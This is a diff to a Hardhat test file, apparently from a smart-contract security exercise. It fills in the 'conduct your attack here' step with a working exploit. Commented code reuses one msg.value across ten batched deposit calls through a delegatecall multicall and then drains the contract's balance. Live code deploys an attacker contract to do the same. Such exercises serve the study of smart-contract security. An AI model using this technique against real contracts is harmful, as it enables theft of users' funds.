@@ -44,7 +44,40 @@ describe(NAME, function () {
     });
 
     // prettier-ignore;
-    it("conduct your attack here", async function () {});
+    it("conduct your attack here", async function () {
+      // console.log("attacker:", ethers.utils.formatEther(await ethers.provider.getBalance(attackerWallet.address)));
+      // console.log("contract:", ethers.utils.formatEther(await ethers.provider.getBalance(multiDelegateCallContract.address)));
+
+      // const abi = [
+      //   "function deposit() public payable",
+      //   "function withdraw(uint256 amount) public",
+      //   "function multicall(bytes[] calldata data) external payable"
+      // ];
+      // const iface = new ethers.utils.Interface(abi);
+      // const calls = [
+      //   iface.encodeFunctionData("deposit"),
+      //   iface.encodeFunctionData("deposit"),
+      //   iface.encodeFunctionData("deposit"),
+      //   iface.encodeFunctionData("deposit"),
+      //   iface.encodeFunctionData("deposit"),
+      //   iface.encodeFunctionData("deposit"),
+      //   iface.encodeFunctionData("deposit"),
+      //   iface.encodeFunctionData("deposit"),
+      //   iface.encodeFunctionData("deposit"),
+      //   iface.encodeFunctionData("deposit"),
+      //   // iface.encodeFunctionData("withdraw", ["10"]),
+      // ];
+      // await multiDelegateCallContract
+      //   .connect(attackerWallet)
+      //   .multicall(calls, { value: ethers.utils.parseEther("1") });
+
+      // await multiDelegateCallContract
+      //   .connect(attackerWallet)
+      //   .withdraw(await ethers.provider.getBalance(multiDelegateCallContract.address));
+
+      const attacker = await (await ethers.getContractFactory("MultiDelegateCallAttacker", attackerWallet)).deploy();
+      await attacker.attack(multiDelegateCallContract.address, { value: ethers.utils.parseEther("1") });
+    });
 
     after(async function () {
       const attackerWalletBalanceAfter = await ethers.provider.getBalance(
